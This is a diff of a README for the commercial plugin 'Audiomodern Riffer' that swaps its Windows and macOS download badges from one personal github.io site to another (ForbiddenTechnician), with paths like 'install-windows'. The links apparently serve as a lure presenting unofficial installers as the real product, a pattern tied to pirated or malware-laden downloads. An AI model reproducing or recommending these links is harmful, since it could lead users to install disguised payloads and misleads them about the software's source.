@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Audiomodern Riffer](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_AUDIOMODERN_RIFFER-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
+[![Download Audiomodern Riffer](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_AUDIOMODERN_RIFFER-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://ForbiddenTechnician.github.io/install-windows/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **Audiomodern Riffer** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-00695C?style=for-the-badge&logo=windows&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-00695C?style=for-the-badge&logo=apple&logoColor=white)](https://WalkerCelebrate.github.io/macpkg/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-00695C?style=for-the-badge&logo=windows&logoColor=white)](https://ForbiddenTechnician.github.io/install-windows/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-00695C?style=for-the-badge&logo=apple&logoColor=white)](https://ForbiddenTechnician.github.io/install-macos/)
 
 </div>
 
